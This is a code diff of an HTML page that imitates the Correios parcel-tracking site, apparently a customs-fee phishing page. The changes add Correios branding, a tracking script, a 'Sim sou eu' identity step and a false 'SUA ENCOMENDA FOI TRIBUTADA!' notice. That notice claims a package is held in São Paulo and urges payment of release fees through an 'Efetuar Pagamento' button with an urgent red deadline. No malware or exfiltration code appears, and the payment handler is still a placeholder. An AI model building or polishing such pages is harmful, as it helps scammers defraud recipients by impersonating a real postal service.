@@ -5,6 +5,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="stylesheet" href="css/bootstrap.css" />
+  <link rel="stylesheet" href="css/app.css" />
+  <link rel="stylesheet" href="css/yellow.css" />
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
   <title>Correios | Rastreio</title>
 
   <style>
@@ -92,7 +97,7 @@
       top: 15px;
     }
 
-    /* ====== Logo centralizada ====== */
+    /* ====== Logo centralizada na horizontal e alinhada com botão consultar ====== */
     header {
       margin-top: 10px;
       display: flex;
@@ -114,6 +119,7 @@
       color: #003157;
     }
 
+    /* Centralizar o título Rastreamento */
     main > h1 {
       margin-bottom: 1.5rem;
       font-weight: 700;
@@ -121,15 +127,7 @@
       color: #003157;
     }
 
-    /* Tela Formulário */
-    #tela-formulario {
-      background-color: #f0f0f0;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-
+    /* Texto "ACOMPANHE SUAS ENCOMENDAS ABAIXO" restaurado */
     #tela-formulario h5 {
       text-align: center;
       font-size: 1.2rem;
@@ -138,6 +136,7 @@
       margin-bottom: 1.5rem;
     }
 
+    /* Formulário com campos e botão centralizados */
     #tela-formulario form {
       display: flex;
       flex-direction: column;
@@ -153,12 +152,14 @@
       text-align: left;
     }
 
+    /* Inputs centralizados e com largura fixa */
     input.form-control {
       max-width: 600px;
       width: 100%;
       margin-bottom: 0;
     }
 
+    /* Botão centralizado */
     #botao-container {
       display: flex;
       justify-content: center;
@@ -187,34 +188,69 @@
       0% {
         transform: scale(1);
       }
+
       50% {
         transform: scale(1.1);
       }
+
       100% {
         transform: scale(1);
       }
     }
 
-    /* Tela Resultado */
+    /* Tela formulário background */
+    #tela-formulario {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    /* Resultado */
     #resultado {
       background: #f0f0f0;
+      border-radius: 8px;
       padding: 2rem;
+      font-family: Arial, sans-serif;
+      color: #003157;
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
       margin: 2rem auto;
       display: none;
     }
 
-    /* Tela Pagamento */
+    /* Pagamento */
     #pagamento {
       background: #ffffff;
+      border-radius: 8px;
       padding: 2rem;
+      font-family: Arial, sans-serif;
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
       margin: 2rem auto;
       display: none;
     }
 
+    #resultado h2, #pagamento h2 {
+      font-weight: 700;
+      margin-bottom: 1rem;
+      font-size: 14px;
+    }
+
+    #resultado p, #pagamento p {
+      font-size: 14px;
+      margin: 0.5rem 0;
+    }
+
+    #resultado p span, #pagamento p span {
+      font-weight: 700;
+      color: #007bff;
+    }
+
+    /* Alert styles */
     .alert-title {
       color: #dc3545;
       font-weight: bold;
@@ -222,26 +258,15 @@
       margin-bottom: 15px;
     }
     
-    .status-line {
-      margin: 10px 0;
-      font-weight: bold;
-    }
-    
     .status-label {
       color: #003157;
+      font-weight: bold;
+      margin-bottom: 5px;
     }
     
     .status-value {
       color: #ffc107;
-    }
-    
-    .status-value:before {
-      content: "🟡 ";
-    }
-    
-    .delivery-info {
-      color: #6ea8fe;
-      margin: 15px 0;
+      font-weight: bold;
     }
     
     .normal-text {
@@ -249,22 +274,63 @@
       margin: 15px 0;
     }
 
-    /* Botão fino */
-    .thin-button {
-      padding: 0.4rem 1.5rem;
-      font-size: 1rem;
+    /* Rua e Bairro vazios */
+    #res-rua,
+    #res-bairro,
+    #pag-rua,
+    #pag-bairro {
+      color: transparent !important;
+      user-select: none;
+      pointer-events: none;
+    }
+
+    /* Prazo para regularização em vermelho */
+    #res-prazo {
+      font-size: 14px;
+      font-weight: 700;
+      color: red !important;
+    }
+
+    /* Botão sim sou eu */
+    #btn-sim-sou-eu, #btn-pagar {
+      margin-top: 1.5rem;
+      padding: 0.6rem 1.5rem;
+      font-size: 1.1rem;
       background-color: #007bff;
       color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 5px;
       cursor: pointer;
-      margin: 1rem 0;
+      transition: background-color 0.3s ease;
+      display: inline-block;
+      max-width: 600px;
       width: 100%;
-      max-width: 500px;
     }
 
-    .thin-button:hover {
+    #btn-sim-sou-eu:hover, #btn-pagar:hover {
       background-color: #0056b3;
+    }
+
+    /* Container para alinhar botão e link */
+    #resultado .btn-container, #pagamento .btn-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1.5rem;
+    }
+
+    /* Link não sou eu abaixo do botão */
+    #nao-sou-eu, #voltar-rastreio {
+      color: gray;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 14px;
+      display: inline-block;
+    }
+
+    #nao-sou-eu:hover, #voltar-rastreio:hover {
+      color: #505050;
     }
 
     /* Spinner */
@@ -282,6 +348,34 @@
       to {
         transform: rotate(360deg);
       }
+    }
+    
+    /* Breadcrumb navigation */
+    .breadcrumb {
+      background-color: #e3f2fd;
+      padding: 8px 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    
+    .breadcrumb a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    
+    .breadcrumb a:hover {
+      text-decoration: underline;
+    }
+    
+    .breadcrumb .active {
+      color: #6c757d;
+    }
+    
+    .breadcrumb > li + li:before {
+      content: ">";
+      padding: 0 5px;
+      color: #6c757d;
     }
   </style>
 </head>
@@ -360,33 +454,28 @@
 
     <!-- Tela Pagamento -->
     <section id="pagamento">
-      <div style="margin-bottom: 20px; font-weight: bold;">
-        Portal Correios Rastreamento
-      </div>
+      <ul class="breadcrumb">
+        <li><a href="#">Portal Correios</a></li>
+        <li class="active">Rastreamento</li>
+      </ul>
       
       <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
       
-      <div class="status-line">
-        <span class="status-label">STATUS DA ENTREGA:</span>
-        <span class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</span>
-      </div>
+      <div class="status-label">STATUS DA ENTREGA:</div>
+      <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
       
-      <div class="delivery-info">
-        Sua encomenda está retida na agência dos Correios em São Paulo
-      </div>
+      <p class="normal-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
-      <button class="thin-button">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
-      
-      <div style="margin-top: 20px;">
+      <div class="btn-container">
+        <button id="btn-pagar">Efetuar Pagamento</button>
         <p>Objeto aguardando sua confirmação</p>
         <p>em Unidade de Fiscalização em São Paulo</p>
         <p>Objeto em transferência - por favor aguarde</p>
         <p>Objeto Postado</p>
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
-      
-      <a href="#" id="voltar-rastreio" style="display: inline-block; margin-top: 15px;">Voltar ao rastreamento</a>
     </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
@@ -396,37 +485,37 @@
     </section>
   </main>
 
-  <footer style="display: flex; flex-wrap: wrap; justify-content: center; padding: 20px 5px; background-color: #ffd500; color: #003157; font-family: Arial, sans-serif; font-size: 14px; text-align: center;">
-    <div style="padding: 0 15px; margin-bottom: 15px;">
-      <h5 style="font-weight: 700; margin-bottom: 10px;">Fale Conosco</h5>
+  <footer class="d-flex flex-wrap justify-content-center px-5 py-4 bg-yellow text-blue-dark" style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;">
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Fale Conosco</h5>
       <ul style="list-style: none; padding-left: 0;">
-        <li style="margin-bottom: 5px;">Registro de Manifestações</li>
-        <li style="margin-bottom: 5px;">Central de Atendimento</li>
-        <li style="margin-bottom: 5px;">Soluções para o seu negócio</li>
-        <li style="margin-bottom: 5px;">Suporte ao cliente com contrato</li>
-        <li style="margin-bottom: 5px;">Ouvidoria</li>
+        <li class="mb-2">Registro de Manifestações</li>
+        <li class="mb-2">Central de Atendimento</li>
+        <li class="mb-2">Soluções para o seu negócio</li>
+        <li class="mb-2">Suporte ao cliente com contrato</li>
+        <li class="mb-2">Ouvidoria</li>
       </ul>
     </div>
 
-    <div style="padding: 0 15px; margin-bottom: 15px;">
-      <h5 style="font-weight: 700; margin-bottom: 10px;">Sobre Correios</h5>
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Sobre Correios</h5>
       <ul style="list-style: none; padding-left: 0;">
-        <li style="margin-bottom: 5px;">Identidade corporativa</li>
-        <li style="margin-bottom: 5px;">Educação e cultura</li>
-        <li style="margin-bottom: 5px;">Código de ética</li>
-        <li style="margin-bottom: 5px;">Transparência e prestação de contas</li>
-        <li style="margin-bottom: 5px;">Política de Privacidade e Notas Legais</li>
+        <li class="mb-2">Identidade corporativa</li>
+        <li class="mb-2">Educação e cultura</li>
+        <li class="mb-2">Código de ética</li>
+        <li class="mb-2">Transparência e prestação de contas</li>
+        <li class="mb-2">Política de Privacidade e Notas Legais</li>
       </ul>
     </div>
 
-    <div style="padding: 0 15px; margin-bottom: 15px;">
-      <h5 style="font-weight: 700; margin-bottom: 10px;">Outros Sites</h5>
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Outros Sites</h5>
       <ul style="list-style: none; padding-left: 0;">
-        <li style="margin-bottom: 5px;">Loja online dos Correios</li>
+        <li class="mb-2">Loja online dos Correios</li>
       </ul>
     </div>
 
-    <div style="width: 100%; text-align: center; margin-top: 10px;">
+    <div class="w-100 text-center mt-3">
       <p>©️ Copyright 2025 Correios</p>
     </div>
   </footer>
@@ -555,8 +644,8 @@
       document.getElementById("resultado").style.display = "block";
     });
     
-    // Script para o botão de liberação
-    document.querySelector(".thin-button").addEventListener("click", function() {
+    // Script para o botão "Efetuar Pagamento"
+    document.getElementById("btn-pagar").addEventListener("click", function() {
       alert("Redirecionando para página de pagamento...");
       // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
